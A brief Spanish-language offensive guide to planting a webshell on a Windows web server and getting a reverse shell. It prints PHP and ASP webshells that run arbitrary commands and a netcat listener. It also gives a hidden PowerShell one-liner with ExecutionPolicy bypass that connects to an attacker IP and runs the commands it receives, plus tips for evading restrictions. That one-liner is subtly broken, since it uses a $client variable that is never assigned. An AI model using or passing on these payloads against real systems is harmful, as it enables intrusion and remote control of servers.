**Procedimiento para subir webshell en Windows y obtener reverse shell con PowerShell**

---

### 1. Crear webshell básico en Windows (ejemplo PHP o ASP)

Si PHP está disponible:

```php
<?php
if(isset($_GET['cmd'])){
    system($_GET['cmd']);
}
?>
```

Si ASP clásico:

```asp
<%
If Request.QueryString("cmd") <> "" Then
  Set objShell = CreateObject("WScript.Shell")
  Set objExec = objShell.Exec(Request.QueryString("cmd"))
  Response.Write("<pre>" & objExec.StdOut.ReadAll() & "</pre>")
End If
%>
```

---

### 2. Subir webshell

* Método: Upload vía aplicación vulnerable, SMB, FTP, RDP, herramientas (Meterpreter, Powershell Invoke-WebRequest).
* Ubicar en carpeta accesible vía HTTP (IIS, Apache).

---

### 3. Preparar listener en atacante

```bash
nc -lvnp <PORT>
```

---

### 4. Ejecutar reverse shell PowerShell desde webshell

Ejecutar desde webshell (por ejemplo, via navegador):

```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient('<Atacker-IP>',<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}
```

* Sustituir `<Atacker-IP>` y `<PORT>` por IP y puerto propio.

---

### 5. Confirmar shell establecida

* En atacante: recibir prompt PowerShell con permisos del proceso web.
* Comandos básicos: `whoami`, `hostname`, `ipconfig`.

---

### 6. Consideraciones

* PowerShell debe estar disponible y permitido en la máquina Windows.
* Firewall puede bloquear conexiones salientes.
* Si `ExecutionPolicy` bloquea, usar flag `-Exec Bypass`.
* Si PowerShell no disponible, usar otras técnicas (cmd, msfvenom payloads).

---
